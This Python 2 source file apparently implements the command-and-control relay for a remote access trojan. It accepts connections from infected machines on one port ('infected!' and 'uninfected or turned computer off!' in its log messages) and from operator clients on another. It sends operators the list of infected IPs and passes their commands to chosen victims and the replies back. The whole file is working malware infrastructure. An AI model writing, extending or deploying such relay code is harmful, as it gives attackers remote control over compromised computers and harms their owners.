import socket
import sys
from StringIO import StringIO
import threading, time
from packet import Packet
from Queue import Queue,Empty
import errno

class RelayServer:
    def __init__(self):
        self.toClient = {}
        self.toVirus = {}

    def runVirus(self):
        host = '0.0.0.0'
        port = 5715 
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onVirusConnect(client,address)

    def runClient(self):
        host = '0.0.0.0'
        port = 5720
        backlog = 5
        size = 1
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((host,port))
        s.listen(backlog)

        while True:
            client,address = s.accept()
            self.onClientConnect(client,address)

    def run(self):
        threading.Thread(target=self.runClient).start()
        threading.Thread(target=self.runVirus).start()


    def sendIPList(self,address=""):
        state = "100"
        ips = ",".join(self.toVirus.keys())
        length = len(ips)

        pkt = Packet()
        pkt.state = state
        pkt.length = str(length)
        pkt.data = ips

        if address != "":
            pkt.returnIP = address[0]
            self.enqueueToClient(pkt)
        else:
            for ip in self.toClient.keys():
                self.enqueueToClient(pkt,ip)

    def onVirusConnect(self,client,address):
        print address[0] + " infected!"
        q = Queue()
        self.toVirus[address[0]] = (client,q)
        self.sendIPList()
        t = threading.Thread(target=self.receiveFromVirus,args=[client,address])
        t.start()
        threading.Thread(target=self.dequeue,args=[q,client,t]).start()

    def receiveFromVirus(self,s,address):
        while True:
            pkt = Packet()
            try:
                pkt.construct(s)
            except socket.error as error:
                if error.errno == 10054 or error.errno == 104:
                    del self.toVirus[address[0]]
                    self.sendIPList()
                    print address[0] + " uninfected or turned computer off!"
                    break
                else:
                    raise
            self.enqueueToClient(pkt)


    def onClientConnect(self,client,address):
        print address[0] + " connected!"
        q = Queue()
        self.toClient[address[0]] = (client,q)
        self.sendIPList(address)
        t = threading.Thread(target=self.receiveFromClient,args=[client,address])
        t.start()
        threading.Thread(target=self.dequeue,args=[q,client,t]).start()

    def receiveFromClient(self,s,address):
        while True:
            pkt = Packet()
            try:
                pkt.construct(s)
            except socket.error as error:
                if error.errno == 10054 or error.errno == 104:
                    del self.toClient[address[0]]
                    print address[0] + " closed client!"
                    break
                else:
                    raise
            pkt.returnIP = address[0]
            print "return to: " + pkt.returnIP
            self.enqueueToVirus(pkt)

    def enqueueToClient(self,pkt,address=""):
        if address == "":
            q = self.toClient[pkt.returnIP][1]
        else:
            q = self.toClient[address][1]
        q.put(pkt)

    def enqueueToVirus(self,pkt):
        q = self.toVirus[pkt.toIP][1]
        q.put(pkt)

    def dequeue(self,q,s,t):
        while t.isAlive:
            try:
                pkt = q.get(block=True,timeout=60)
                pkt.send(s)
            except Empty:
                pass

def main():
    r = RelayServer()
    r.run()

if __name__ == '__main__':
    main()